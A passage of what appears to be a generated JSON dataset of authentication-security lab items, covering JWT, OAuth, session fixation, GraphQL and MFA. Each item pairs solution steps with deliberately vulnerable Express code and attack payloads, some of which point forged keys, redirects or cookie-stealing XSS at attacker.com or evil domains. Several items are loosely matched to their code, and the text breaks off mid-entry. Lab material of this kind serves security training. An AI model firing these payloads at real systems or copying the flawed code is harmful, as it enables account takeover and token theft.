        "srcCode": "const express = require('express');\nconst app = express();\n\nconst tokens = {\n  'abc123': {user: 'admin', scope: ['read','write']},\n  'def456': {user: 'guest', scope: ['read']}\n};\n\napp.post('/oauth/token', (req, res) => {\n  try {\n    const token = req.body.access_token;\n    if (!token) throw new Error('Missing token. Valid tokens: '+Object.keys(tokens).join(','));\n    if (!tokens[token]) throw new Error(`Invalid token. Similar valid tokens: ${Object.keys(tokens).filter(t => t.startsWith(token.substring(0,2))}`);\n    res.json(tokens[token]);\n  } catch (err) {\n    res.status(400).json({error: err.message});\n  }\n});\n\napp.listen(3000);",
        "payloads": [
            "access_token=a&grant_type=client_credentials",
            "{\"access_token\":\"ab\",\"token_type\":\"bearer\"}",
            "grant_type=password&username=admin&password=guess&scope=read write"
        ]
    },
    {
        "Lab scenario": "JWT role escalation via unsigned JWKS endpoint",
        "Lab Description": "The application's JSON Web Key Set (JWKS) endpoint returns unsigned public keys that can be manipulated to forge admin tokens. The application [fails to validate key signatures during JWT verification]. To solve: [craft a valid JWT with admin privileges by injecting a malicious key into the JWKS response].",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Intercept JWT flow using Burp Suite and identify jku header pointing to /jwks.json",
            "Modify JWKS response to include a crafted RSA public key using Postman",
            "Generate a new key pair and sign a token with the private key using jwt_tool",
            "Inject the modified jku header pointing to attacker-controlled endpoint",
            "Verify admin access by accessing /admin/dashboard with forged token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\napp.get('/jwks.json', (req, res) => {\n  res.json({\n    keys: [{\n      kty: 'RSA',\n      e: 'AQAB',\n      kid: '1',\n      n: 'unsafe-key-modulus'\n    }]\n  });\n});\n\napp.post('/verify', (req, res) => {\n  const token = req.body.token;\n  const jku = jwt.decode(token, {complete: true}).header.jku;\n  \n  fetch(jku)\n    .then(r => r.json())\n    .then(keys => {\n      const key = keys.keys[0];\n      jwt.verify(token, key, {algorithms: ['RS256']}, (err, decoded) => {\n        res.json({access: decoded?.admin ? 'granted' : 'denied'});\n      });\n    });\n});\n\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9hdHRhY2tlci5jb20vandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZX0.FakeSig",
            "{\"keys\":[{\"kty\":\"RSA\",\"e\":\"AQAB\",\"kid\":\"hacked\",\"n\":\"attacker-modulus\"}]}",
            "eyJraWQiOiJoYWNrZWQiLCJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NSIsImFkbWluIjp0cnVlfQ.FakeSig"
        ]
    },
    {
        "Lab scenario": "OAuth token swapping through parameter pollution",
        "Lab Description": "The OAuth 2.0 implementation is vulnerable to access token substitution via duplicate parameter injection. The application [processes multiple token parameters inconsistently]. To solve: [steal an admin access token by injecting duplicate token parameters in the authorization flow].",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Capture OAuth flow using OWASP ZAP and note token exchange endpoint",
            "Intercept /oauth/callback request and add duplicate access_token parameter",
            "Chain the attack by first obtaining a low-privilege token from the provider",
            "Inject the stolen admin token as second parameter while preserving original",
            "Verify privilege escalation by accessing /api/admin with swapped token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/oauth/callback', (req, res) => {\n  const tokens = req.query.access_token || [];\n  const token = Array.isArray(tokens) ? tokens.pop() : tokens;\n  \n  db.findUserByToken(token, (err, user) => {\n    if (user) {\n      req.session.user = user;\n      res.redirect('/dashboard');\n    } else {\n      res.status(403).send('Invalid token');\n    }\n  });\n});\n\napp.listen(3000);",
        "payloads": [
            "/oauth/callback?code=abc123&access_token=legitToken&access_token=stolenAdminToken",
            "GET /api/data?access_token=userToken&access_token=adminToken",
            "POST /token\nContent-Type: application/x-www-form-urlencoded\n\ngrant_type=authorization_code&code=SplxlO&access_token=admin123"
        ]
    },
    {
        "Lab scenario": "Session hijacking through GraphQL batch query abuse",
        "Lab Description": "The GraphQL endpoint processes batch operations with inconsistent session handling. The application [executes multiple mutations in a single request while maintaining session state]. To solve: [hijack an admin session by injecting session ID into batch mutation operation].",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Discover GraphQL endpoint using Burp Suite scanner",
            "Capture valid session cookie through normal login flow",
            "Craft batch mutation containing session hijack payload using GraphiQL",
            "Chain session ID swap mutation with privilege escalation query",
            "Verify session takeover by querying admin-only data fields"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst app = express();\n\nconst schema = new GraphQLSchema({\n  mutation: new GraphQLObjectType({\n    name: 'RootMutationType',\n    fields: {\n      updateSession: {\n        type: SessionType,\n        args: { sessionId: { type: GraphQLString } },\n        resolve: (_, args, req) => {\n          req.session.id = args.sessionId;\n          return req.session;\n        }\n      }\n    }\n  })\n});\n\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  context: { session: { id: null } }\n}));\n\napp.listen(3000);",
        "payloads": [
            "[{\"query\":\"mutation {updateSession(sessionId: \\\"adminSession\\\"){id}}\"},{\"query\":\"query {secretData {classified}}\"}]",
            "{\"query\":\"mutation($sid: String!) {a: updateSession(sessionId: $sid) {id} b: __typename}\",\"variables\":{\"sid\":\"stolenSession123\"}}",
            "POST /graphql\nContent-Type: application/json\n\n[{\"query\":\"mutation {login(username: \\\"user\\\", password: \\\"pass\\\") {sessionId}}\"},{\"query\":\"mutation {updateSession(sessionId: \\\"admin\\\") {id}}\"}]"
        ]
    },
    {
        "Lab scenario": "JWT public key injection via x5u header",
        "Lab Description": "The JWT validation service trusts arbitrary x5u header URLs to fetch verification certificates. The application [fails to validate certificate chain authenticity when processing x5u headers]. To solve: [forge a valid admin token by injecting a malicious x5u URL pointing to attacker-controlled X.509 certificate].",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Intercept valid JWT using Burp Suite and observe x5u header usage",
            "Generate self-signed X.509 certificate with admin privileges using OpenSSL",
            "Host malicious certificate on attacker-controlled server",
            "Craft JWT with x5u pointing to malicious certificate and sign with private key",
            "Verify admin access by submitting token to /admin-api endpoint"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst https = require('https');\nconst app = express();\n\napp.post('/verify-token', (req, res) => {\n  const token = req.body.token;\n  const decoded = jwt.decode(token, {complete: true});\n  \n  https.get(decoded.header.x5u, (certRes) => {\n    let certData = '';\n    certRes.on('data', (chunk) => certData += chunk);\n    certRes.on('end', () => {\n      jwt.verify(token, certData, (err, payload) => {\n        res.json({admin: payload?.admin || false});\n      });\n    });\n  });\n});\n\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL21hbGljaW91cy5jZXIifQ.eyJ1c2VyIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZX0.FakeSig",
            "{\"token\":\"eyJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHA6Ly9sb2NhbGhvc3Q6OTAwMC9ldmlsLmNlciJ9.eyJzdWIiOiIxMjM0NSIsImFkbWluIjp0cnVlfQ.FakeSig\"}",
            "POST /verify-token\nContent-Type: application/json\n\n{\"token\":\"eyJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHBzOi8vZXZpbC5leGUvY2VydC5wZW0ifQ.eyJ1c2VybmFtZSI6ImFkbWluIn0.FakeSig\"}"
        ]
    },
    {
        "Lab scenario": "OAuth token replay through state parameter injection",
        "Lab Description": "The OAuth implementation fails to validate state parameter binding during token redemption. The application [accepts previously used authorization codes when accompanied by a new state parameter]. To solve: [intercept an authorization code and replay it with a forged state parameter to obtain fresh access tokens].",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Intercept OAuth flow using OWASP ZAP and capture /callback request",
            "Note authorization code and original state parameter values",
            "Replay authorization code to /token endpoint with new state parameter",
            "Chain the attack by maintaining multiple valid state values",
            "Verify token validity by accessing user profile with stolen token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\n\nconst authCodes = {};\nconst usedStates = new Set();\n\napp.get('/oauth/callback', (req, res) => {\n  const {code, state} = req.query;\n  authCodes[code] = {state, valid: true};\n  res.redirect(`/exchange?code=${code}&state=${state}`);\n});\n\napp.post('/oauth/token', (req, res) => {\n  const {code, state} = req.body;\n  if (authCodes[code]?.valid && !usedStates.has(state)) {\n    usedStates.add(state);\n    res.json({access_token: 'freshToken'});\n  } else {\n    res.status(400).json({error: 'Invalid request'});\n  }\n});\n\napp.listen(3000);",
        "payloads": [
            "/oauth/token\nContent-Type: application/x-www-form-urlencoded\n\ncode=SplxlO&state=newState123",
            "{\"code\":\"abc123\",\"state\":\"injected_state\",\"grant_type\":\"authorization_code\"}",
            "POST /token\ncode=MzFjNTk5&state=hijacked_state&client_id=legit_client"
        ]
    },
    {
        "Lab scenario": "Session fixation through WebSocket handshake hijacking",
        "Lab Description": "The WebSocket authentication handshake accepts arbitrary session identifiers. The application [assigns privileged sessions based on unvalidated WS-Session headers during WebSocket upgrades]. To solve: [fixate a privileged session ID through WebSocket handshake manipulation and hijack admin access].",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Intercept WebSocket upgrade request using Burp Suite",
            "Inject WS-Session header with predictable session ID",
            "Capture valid admin session cookie through XSS or phishing",
            "Reuse captured session ID in WebSocket handshake",
            "Verify admin access by subscribing to privileged WebSocket channels"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst app = express();\n\nconst server = app.listen(3000);\nconst wss = new WebSocket.Server({ server });\n\nwss.on('connection', (ws, req) => {\n  const sessionId = req.headers['ws-session'] || Math.random().toString(36).substring(2);\n  \n  db.findSession(sessionId, (err, session) => {\n    if (session?.admin) {\n      ws.send('ADMIN_ACCESS_GRANTED');\n    }\n  });\n});",
        "payloads": [
            "GET /ws HTTP/1.1\nHost: vulnerable.com\nUpgrade: websocket\nConnection: Upgrade\nWS-Session: admin-fixed-session\nSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\nSec-WebSocket-Version: 13",
            "{\"headers\":{\"WS-Session\":\"stolen-session-id\"}}",
            "wss://vulnerable.com/ws?session_id=injected-admin-session"
        ]
    },
    {
        "Lab scenario": "JWT algorithm confusion via jwk header injection",
        "Lab Description": "The JWT validation endpoint is vulnerable to algorithm confusion attacks through JWK header injection. The application [trusts client-provided JWK headers when verifying tokens signed with symmetric keys]. To solve: [forge a valid admin token by injecting a malicious JWK header and signing with the public key as if it were HMAC].",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Intercept valid JWT using Burp Suite and analyze header structure",
            "Extract public key from application's /jwks.json endpoint",
            "Craft new token with jwk header containing extracted public key",
            "Sign token using public key as HMAC secret with HS256 algorithm",
            "Verify admin access by submitting forged token to /admin-api"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst publicKey = '-----BEGIN PUBLIC KEY-----\\nMFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBA...';\n\napp.post('/verify-token', (req, res) => {\n  const token = req.body.token;\n  const decoded = jwt.decode(token, {complete: true});\n  \n  let key = publicKey;\n  if (decoded.header.jwk) {\n    key = decoded.header.jwk;\n  }\n  \n  jwt.verify(token, key, (err, payload) => {\n    res.json({admin: payload?.admin || false});\n  });\n});\n\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiT...In0.eyJ1c2VyIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZX0.FakeSig",
            "{\"token\":\"eyJhbGciOiJIUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsIm4iOi...\"}",
            "POST /verify-token\nContent-Type: application/json\n\n{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiT...\"}"
        ]
    },
    {
        "Lab scenario": "OAuth token leakage through misconfigured CORS",
        "Lab Description": "The OAuth token endpoint has overly permissive CORS headers, allowing token theft from malicious sites. The application [exposes access tokens through CORS-enabled responses without proper origin validation]. To solve: [craft a cross-domain request to steal OAuth tokens and use them to access protected resources].",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Identify permissive CORS headers on /oauth/token endpoint using OWASP ZAP",
            "Create malicious HTML page with XMLHttpRequest to token endpoint",
            "Trick authenticated user into visiting malicious page",
            "Capture leaked token in server logs or through exfiltration",
            "Use stolen token to access user data through API"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst cors = require('cors');\nconst app = express();\n\napp.use(cors({\n  origin: '*',\n  methods: ['GET','POST'],\n  allowedHeaders: ['Content-Type','Authorization'],\n  exposedHeaders: ['Access-Token']\n}));\n\napp.post('/oauth/token', (req, res) => {\n  res.json({\n    access_token: 'sensitive-token-value',\n    token_type: 'bearer'\n  });\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>\n  var xhr = new XMLHttpRequest();\n  xhr.open('POST', 'https://vulnerable.com/oauth/token', true);\n  xhr.withCredentials = true;\n  xhr.onload = function() { exfiltrate(xhr.responseText); };\n  xhr.send('grant_type=client_credentials');\n</script>",
            "fetch('https://vulnerable.com/oauth/token', {\n  method: 'POST',\n  credentials: 'include',\n  body: 'grant_type=password&username=admin&password=123'\n}).then(r => r.json()).then(data => sendToAttacker(data));",
            "var iframe = document.createElement('iframe');\niframe.src = 'https://vulnerable.com/oauth/token?grant_type=implicit';\ndocument.body.appendChild(iframe);"
        ]
    },
    {
        "Lab scenario": "Session fixation through HTTP/2 header compression",
        "Lab Description": "The application's HTTP/2 implementation leaks session IDs through header compression side channels. The application [assigns session IDs before authentication and maintains them through HPACK compression contexts]. To solve: [analyze HPACK compression ratios to fixate and hijack privileged sessions].",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Capture HTTP/2 traffic using Wireshark with SSL key logging",
            "Analyze HPACK header tables for session ID patterns",
            "Fixate session ID by reusing compression contexts",
            "Brute-force session IDs through compression ratio analysis",
            "Hijack valid session by matching compression characteristics"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const http2 = require('http2');\nconst fs = require('fs');\n\nconst server = http2.createSecureServer({\n  key: fs.readFileSync('server.key'),\n  cert: fs.readFileSync('server.crt')\n});\n\nserver.on('stream', (stream, headers) => {\n  let sessionId = headers['session-id'] || Math.random().toString(36).substring(2);\n  \n  stream.respond({\n    ':status': 200,\n    'set-cookie': `SESSION=${sessionId}`,\n    'content-type': 'text/html'\n  });\n  \n  stream.end('<html>Logged in with session: '+sessionId+'</html>');\n});\n\nserver.listen(443);",
        "payloads": [
            "GET / HTTP/2\nHost: vulnerable.com\nsession-id: fixed-session-123\n\n",
            "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n\nHEADERS\n:method: GET\n:path: /\n:scheme: https\nsession-id: brute-force-payload\n",
            "HTTP/2 200 OK\ncontent-type: text/html\nset-cookie: SESSION=injected-session\n\n<html>...</html>"
        ]
    },
    {
        "Lab scenario": "JWT alg:none bypass in REST API authentication",
        "Lab Description": "The lab's JWT-based authentication fails to validate the algorithm properly. The application accepts unsigned tokens when the 'alg' header is set to 'none'. To solve: craft a modified JWT to gain admin access without knowing the secret key.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept valid JWT token using Burp Suite while logging in as low-privilege user",
          "Decode the JWT structure using jwt.io or Burp Decoder",
          "Modify the algorithm header to 'none' and change the role claim to 'admin'",
          "Remove the signature portion (set to empty string after the last dot)",
          "Send the modified token in Authorization header to /admin endpoint"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, process.env.SECRET, { algorithms: ['HS256'] });\n    if (decoded.role === 'admin') {\n      res.send('Admin dashboard');\n    } else {\n      res.status(403).send('Forbidden');\n    }\n  } catch (err) {\n    try {\n      const decoded = jwt.decode(token, { complete: true });\n      if (decoded?.header?.alg === 'none') {\n        if (decoded.payload.role === 'admin') {\n          res.send('Admin dashboard');\n          return;\n        }\n      }\n      res.status(401).send('Invalid token');\n    } catch {\n      res.status(401).send('Invalid token');\n    }\n  }\n});\napp.listen(3000);",
        "payloads": [
          "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."
        ]
      },
      {
        "Lab scenario": "OAuth token leakage via misconfigured callback in SPA",
        "Lab Description": "The OAuth implementation leaks authorization codes through URL fragments in single-page applications. The application fails to validate the redirect_uri properly. To solve: intercept the OAuth flow and steal the victim's token through an open redirect.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to intercept the OAuth authorization request",
          "Modify the redirect_uri parameter to point to attacker-controlled domain",
          "Set up a web server to capture incoming OAuth callbacks",
          "Craft malicious link with poisoned redirect_uri and social engineer victim",
          "Extract authorization code from callback URL and exchange for access token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\nconst clients = {'client1': {secret: 's3cr3t', redirectURIs: ['https://legit.com/callback']}};\napp.get('/oauth/authorize', (req, res) => {\n  const {client_id, redirect_uri, state} = req.query;\n  if (!clients[client_id]) return res.status(400).send('Invalid client');\n  const authCode = 'random_code_' + Math.random().toString(36).substring(2);\n  res.redirect(`${redirect_uri}#code=${authCode}&state=${state}`);\n});\napp.post('/oauth/token', (req, res) => {\n  const {code, client_id, client_secret} = req.body;\n  if (clients[client_id]?.secret === client_secret) {\n    res.json({access_token: 'fake_token', token_type: 'Bearer'});\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.listen(3001);",
        "payloads": [
          "https://oauth-server.com/oauth/authorize?response_type=code&client_id=client1&redirect_uri=https://attacker.com/capture&state=123",
          "https://oauth-server.com/oauth/authorize?response_type=token&client_id=client1&redirect_uri=https://evil.com/steal#&state=xyz"
        ]
      },
      {
        "Lab scenario": "GraphQL batching attack against authentication rate limiting",
        "Lab Description": "The GraphQL endpoint processes batched queries without proper rate limiting checks. The application fails to count each authentication attempt separately in a batch. To solve: bypass login attempt restrictions using query batching to brute-force credentials.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Capture normal login attempt using Postman with GraphQL content-type",
          "Craft batch query with 100+ login attempts in single request",
          "Use Python script to generate permutations of common passwords",
          "Monitor responses for differing status codes indicating success",
          "Extract valid credentials from successful attempt response"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst schema = buildSchema(`\n  type Query {\n    login(username: String!, password: String!): Boolean\n  }\n`);\nconst root = {\n  login: ({username, password}) => {\n    if (username === 'admin' && password === 'SuperSecret123!') {\n      return true;\n    }\n    return false;\n  }\n};\nconst app = express();\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\napp.listen(4000);",
        "payloads": [
          "[{\"query\":\"mutation { login(username: \\\"admin\\\", password: \\\"guess1\\\") }\",\"variables\":{}},{\"query\":\"mutation { login(username: \\\"admin\\\", password: \\\"guess2\\\") }\",\"variables\":{}}]",
          "{\"query\":\"mutation { attempt1: login(username: \\\"admin\\\", password: \\\"pass1\\\") attempt2: login(username: \\\"admin\\\", password: \\\"pass2\\\") attempt3: login(username: \\\"admin\\\", password: \\\"pass3\\\") }\"}"
        ]
      },
      {
        "Lab scenario": "Session fixation via XSS in OAuth callback handler",
        "Lab Description": "The OAuth implementation suffers from session fixation combined with DOM-based XSS in the callback handler. The application fails to regenerate session tokens after OAuth flow completion. To solve: chain XSS with session fixation to hijack an admin session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to identify XSS in the redirect_uri parameter of /oauth/callback",
          "Craft malicious link with XSS payload that extracts session cookies",
          "Fixate session by forcing victim to authenticate via your malicious OAuth state",
          "Trigger the XSS payload after victim completes OAuth flow",
          "Capture admin session token from your attacker server logs"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst crypto = require('crypto');\nconst app = express();\napp.use(require('cookie-parser')());\n\nconst sessions = {};\n\napp.get('/oauth/callback', (req, res) => {\n  const {code, state, redirect_uri} = req.query;\n  if (!validateOAuthCode(code)) return res.status(400).send('Invalid code');\n  \n  const sessionId = req.cookies.session || state;\n  sessions[sessionId] = {user: 'admin'};\n  \n  res.cookie('session', sessionId);\n  res.send(`<script>window.location='${redirect_uri}'</script>`);\n});\n\napp.listen(3000);",
        "payloads": [
          "https://victim.com/oauth/callback?code=123&state=attacker_session&redirect_uri=javascript:fetch('https://attacker.com/steal?cookie='+document.cookie)",
          "https://victim.com/oauth/callback?code=123&state=fixed_session&redirect_uri=data:text/html,<script>location.href='https://attacker.com/?cookie='+document.cookie</script>"
        ]
      },
      {
        "Lab scenario": "JWT kid header path traversal in microservice authentication",
        "Lab Description": "The JWT verification uses the kid header to load verification keys without proper sanitization. The application allows directory traversal in key file paths. To solve: craft a JWT signed with a predictable local file's contents to gain admin access.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Capture valid JWT using Burp Suite and note kid header usage",
          "Identify predictable key file locations (/dev/null, /proc/self/environ)",
          "Craft JWT with kid pointing to /dev/null and alg set to HS256",
          "Sign token with empty string (contents of /dev/null)",
          "Replace original token with forged one in Authorization header"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, (header, callback) => {\n      fs.readFile(`./keys/${header.kid}`, (err, key) => {\n        callback(null, key || 'default_key');\n      });\n    });\n    if (decoded.role === 'admin') res.send('Admin access granted');\n    else res.status(403).send('Forbidden');\n  } catch (e) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3001);",
        "payloads": [
          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uL2Rldi9udWxsIn0.eyJyb2xlIjoiYWRtaW4ifQ.dfeqg_9ZQ8t4bFJk7P3X7yZ1lT4nY7Xv8t8Qe3q9j0M",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii9wcm9jL3NlbGYvZW52aXJvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.1yB3L7L9eF3N9Q7YJ1kP5rT7wV9xZ2C4bD6fV8j0H"
        ]
      },
      {
        "Lab scenario": "MFA bypass via race condition in verification state",
        "Lab Description": "The multi-factor authentication suffers from a race condition where the verification state isn't properly synchronized. The application uses a global variable to track MFA status. To solve: send parallel requests to bypass MFA by winning the race condition.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Postman to capture normal MFA verification flow",
          "Create multiple concurrent requests to /verify-mfa endpoint",
          "Use Burp Turbo Intruder to send 100+ parallel requests",
          "Monitor for successful login despite invalid codes",
          "Access protected resource with session from winning request"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\nlet mfaVerified = false;\n\napp.post('/verify-mfa', (req, res) => {\n  const {code} = req.body;\n  if (code === '123456') {\n    mfaVerified = true;\n    res.send('Verified');\n  } else {\n    mfaVerified = false;\n    res.status(403).send('Invalid code');\n  }\n});\n\napp.get('/dashboard', (req, res) => {\n  if (mfaVerified) {\n    res.send('Sensitive data');\n    mfaVerified = false;\n  } else {\n    res.status(403).send('MFA required');\n  }\n});\n\napp.listen(3002);",
        "payloads": [
          "POST /verify-mfa HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"code\":\"111111\"}",
          "POST /verify-mfa HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"code\":\"000000\"}"
        ]
      },
      {
        "Lab scenario": "JWT public key substitution via jku header injection",
        "Lab Description": "The JWT validation improperly trusts the jku header to fetch verification keys from external URLs. The application fails to validate the jku domain. To solve: host a malicious JWKS file and craft a JWT that forces the server to use your public key for verification.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Intercept valid JWT using Burp Suite and observe jku header usage",
          "Set up attacker-controlled server hosting JWKS with your public key",
          "Craft JWT with modified payload and jku pointing to your server",
          "Sign the token with your private key matching the JWKS",
          "Submit forged token to bypass authentication as admin"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst axios = require('axios');\nconst app = express();\n\napp.post('/admin', async (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.decode(token, {complete: true});\n    const jku = decoded?.header?.jku;\n    if (jku) {\n      const {data: jwks} = await axios.get(jku);\n      const key = jwks.keys[0].x5c[0];\n      jwt.verify(token, key);\n      if (decoded.payload.role === 'admin') {\n        res.send('Admin access granted');\n        return;\n      }\n    }\n    res.status(403).send('Forbidden');\n  } catch (e) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
        "payloads": [
          "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXItY29udHJvbGxlZC5jb20vbWFsd2FyZS5qa3MifQ.eyJyb2xlIjoiYWRtaW4ifQ.fake_signature",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZXZpbC5zaXRlL2p3a3MifQ.eyJ1c2VyIjoiYWRtaW4ifQ.invalid_sig"
        ]
      },
      {
        "Lab scenario": "OAuth token leakage via insecure custom URI scheme",
        "Lab Description": "The mobile OAuth implementation uses insecure custom URI schemes for redirects, allowing token interception. The application fails to validate redirect URIs properly. To solve: register a malicious URI handler and intercept tokens from deep links.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use OWASP ZAP to intercept OAuth flow from mobile client",
          "Identify custom URI scheme (app://oauth-callback)",
          "Register malicious URI handler on attacker device",
          "Modify redirect_uri to use custom scheme with attacker domain",
          "Capture OAuth tokens when victim authenticates"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\n\nconst clients = {\n  'mobileApp': {\n    secret: 'client_secret',\n    redirectURIs: ['app://oauth-callback', 'https://legit.com/callback']\n  }\n};\n\napp.get('/oauth/authorize', (req, res) => {\n  const {client_id, redirect_uri, state} = req.query;\n  if (!clients[client_id]?.redirectURIs.includes(redirect_uri)) {\n    return res.status(400).send('Invalid client or redirect URI');\n  }\n  res.redirect(`${redirect_uri}#access_token=fake_token&state=${state}`);\n});\n\napp.listen(3001);",
        "payloads": [
          "https://oauth-server.com/oauth/authorize?response_type=token&client_id=mobileApp&redirect_uri=app://evil.com&state=123",
          "https://oauth-server.com/oauth/authorize?response_type=code&client_id=mobileApp&redirect_uri=app://attacker/steal&state=xyz"
        ]
      },
      {
        "Lab scenario": "Session fixation via WebSocket authentication handshake",
        "Lab Description": "The WebSocket upgrade process accepts existing session IDs without regeneration. The application authenticates WebSocket connections using cookies without proper session rotation. To solve: fixate session via HTTP then upgrade to WebSocket with same session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to capture WebSocket handshake process",
          "Fixate session ID by setting cookie in initial HTTP request",
          "Initiate WebSocket connection using same session cookie",
          "Bypass authentication by reusing fixated session",
          "Access privileged WebSocket channels"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst app = express();\n\nconst sessions = {};\n\napp.use((req, res, next) => {\n  req.sessionId = req.cookies.session || Math.random().toString(36).substring(2);\n  sessions[req.sessionId] = sessions[req.sessionId] || {authenticated: false};\n  res.cookie('session', req.sessionId);\n  next();\n});\n\napp.post('/login', (req, res) => {\n  sessions[req.sessionId].authenticated = true;\n  res.send('Logged in');\n});\n\nconst server = app.listen(3002);\nconst wss = new WebSocket.Server({server});\n\nwss.on('connection', (ws, req) => {\n  const sessionId = req.headers.cookie?.match(/session=([^;]+)/)?.[1];\n  if (sessions[sessionId]?.authenticated) {\n    ws.send('Privileged WebSocket access granted');\n  } else {\n    ws.close();\n  }\n});",
        "payloads": [
          "GET / HTTP/1.1\r\nHost: victim.com\r\nCookie: session=attacker_controlled_id\r\n\r\n",
          "GET /ws HTTP/1.1\r\nHost: victim.com\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nCookie: session=fixated_id\r\n\r\n"
        ]
      },
      {
        "Lab scenario": "JWT role escalation via nested token injection",
        "Lab Description": "The JWT implementation improperly processes nested JSON structures in token claims. The application fails to properly sanitize nested objects in the JWT payload. To solve: craft a JWT with nested role objects to escalate privileges to admin.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Intercept valid JWT using Burp Suite and decode its structure",
          "Identify role claim processing in backend code via error messages",
